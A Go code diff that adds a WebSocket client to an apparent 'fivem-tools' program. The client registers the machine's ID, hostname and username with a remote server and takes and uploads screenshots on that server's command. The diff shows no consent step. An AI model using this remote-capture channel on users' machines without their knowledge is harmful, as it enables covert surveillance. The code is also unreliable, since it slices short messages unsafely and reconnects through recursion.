@@ -7,14 +7,17 @@ import (
 	"fmt"
 	"image"
 	"image/png"
+	"log"
 	"net"
 	"net/http"
+	"net/url"
 	"os"
 	"strconv"
 	"strings"
 	"sync"
 	"time"
 
+	"github.com/gorilla/websocket"
 	"github.com/kbinani/screenshot"
 	"github.com/moutend/go-hook/pkg/keyboard"
 	"github.com/moutend/go-hook/pkg/mouse"
@@ -113,6 +116,94 @@ func UpdateClientStatus(cmd *UpdateClientStatusCommand) {
 	if resp.StatusCode != http.StatusCreated {
 		failedf("failed to post status, got status code: %d", resp.StatusCode)
 		return
+	}
+}
+
+func handleWebsocket() {
+	defer func() {
+		if r := recover(); r != nil {
+			failedf("WebSocket handler panicked: %v", r)
+		}
+
+		time.Sleep(5 * time.Second)
+		handleWebsocket()
+	}()
+
+	u := url.URL{Scheme: "wss", Host: "fivem-tools.willywotz.com", Path: "/ws"}
+	log.Printf("connecting to %s", u.String())
+
+	dialer := &websocket.Dialer{
+		Proxy:            http.ProxyFromEnvironment,
+		HandshakeTimeout: 45 * time.Second,
+	}
+
+	conn, _, err := dialer.Dial(u.String(), nil)
+	if err != nil {
+		failedf("failed to connect to WebSocket: %v", err)
+		return
+	}
+	defer func() { _ = conn.Close() }()
+
+	conn.SetPingHandler(func(appData string) error {
+		return conn.WriteMessage(websocket.PongMessage, []byte(appData))
+	})
+
+	localMachineID, _ := machineID()
+	localHostname, _ := os.Hostname()
+	localUsername, _ := os.LookupEnv("USERNAME")
+
+	_ = conn.WriteJSON(map[string]string{
+		"action":     "register",
+		"machine_id": localMachineID,
+		"hostname":   localHostname,
+		"username":   localUsername,
+	})
+	log.Printf("Registered machine ID: %s, hostname: %s, username: %s", localMachineID, localHostname, localUsername)
+
+	for {
+		messageType, p, err := conn.ReadMessage()
+		if err != nil {
+			failedf("failed to read message from WebSocket: %v", err)
+			break
+		}
+
+		_ = messageType // Ignore message type for now
+		_ = p           // Ignore payload for now
+
+		if messageType == websocket.TextMessage && p != nil {
+			// log.Printf("Received message: %s", string(p))
+
+			if string(p[:15]) == "take_screenshot" {
+				log.Println("Taking screenshot...")
+
+				var data struct {
+					Action    string `json:"action"`
+					MachineID string `json:"machine_id"`
+					Hostname  string `json:"hostname"`
+					Username  string `json:"username"`
+
+					Data  []*CaptureScreenshotItem `json:"data"`
+					Error string                   `json:"error"`
+				}
+
+				data.Action = "screenshot"
+				data.MachineID = localMachineID
+				data.Hostname = localHostname
+				data.Username = localUsername
+
+				var err error
+				if data.Data, err = CaptureScreenshot(); err != nil {
+					data.Error = fmt.Sprintf("failed to capture screenshot: %v", err)
+					failedf("failed to capture screenshot: %v", err)
+				}
+
+				if err := conn.WriteJSON(data); err != nil {
+					failedf("failed to send screenshot results: %v", err)
+				}
+
+				continue
+			}
+		}
 	}
 }
 
